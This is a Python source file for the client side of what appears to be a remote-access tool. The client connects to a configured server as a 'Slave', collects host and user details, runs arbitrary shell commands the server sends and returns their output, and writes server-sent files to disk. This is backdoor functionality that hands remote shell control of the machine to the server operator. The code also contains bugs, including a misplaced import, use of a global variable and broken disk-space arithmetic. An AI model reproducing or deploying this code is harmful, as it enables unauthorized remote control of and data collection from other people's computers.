import psutil
from src.client import Client
from pprint import pprint
import platform
import os
import subprocess as sp
from pathlib import Path
import psutil

class SlaveClient(Client):
    def __init__(self, addr: tuple, debug: bool = False) -> None:
        super().__init__(addr, debug)

        self.commands = Commands(self)

    def handle_connection(self) -> bool:
        if self.debug: print(f"[CLIENT] Sending identity to server")
        self.send_bytes(b'Slave')
        if self.recv_bytes() == b'OK':
            if self.debug: print(f"[CLIENT] Server accepted identity")
            if not self.debug: print(f"[CLIENT] Connected to server")
            return True
        return False

    def execute_command(self, msg):
        try:
            getattr(self.commands, msg['command'])(msg)
        except AttributeError:
            print(f"[CLIENT] Command {msg['command']} not implemented")

    def command_loop(self):
        while True:
            time.sleep(0.1)
            if not self.connected:
                self.connect()
                continue

            msg = slave.recieve_dict()
            if not msg: continue
            self.execute_command(msg)

class Commands:
    def __init__(self, slave) -> None:
        self.slave = slave

    def pc_info(self, msg):
        msg = {
            "hostname": platform.node(),
            "username": os.getlogin(),
            "os": platform.system(),
            "os_version": platform.version(),
            }
        self.slave.send_dict(msg)
    
    def cmd(self, msg):
        res = sp.Popen(msg['command_string'], shell=True, stdout=sp.PIPE, stderr=sp.PIPE)
        output = res.stdout.read().decode('utf-8')
        self.slave.send_dict({'cmd_output': output})
    
    def recieve_file(self, msg):
        destination_path = msg['destination_path']
        destination_path = Path(__file__).parent.joinpath('inbox') if destination_path is None else destination_path
        if not os.path.exists(destination_path):
            self.slave.send_dict({'status': 'error', 'error': 'wrong_path'})
            return
        freespace = psutil.disk_usage('C:/').free / 1024 / 1024 * 1_000_000
        if freespace < msg['filesize']:
            self.slave.send_dict({'status': 'error', 'error': 'no_space'})
            return
        self.slave.send_dict({'status': 'ok'})
        msg = self.slave.recieve_dict()
        if not msg: return
        with open(Path(destination_path).joinpath(msg['filename']), 'wb') as f:
            f.write(msg['file_data'])
        self.slave.send_dict({'status': 'ok'})


if __name__ == "__main__":
    from config import Config
    import time

    slave = SlaveClient(addr=Config.SERVER_ADDR, debug=False)

    slave.command_loop()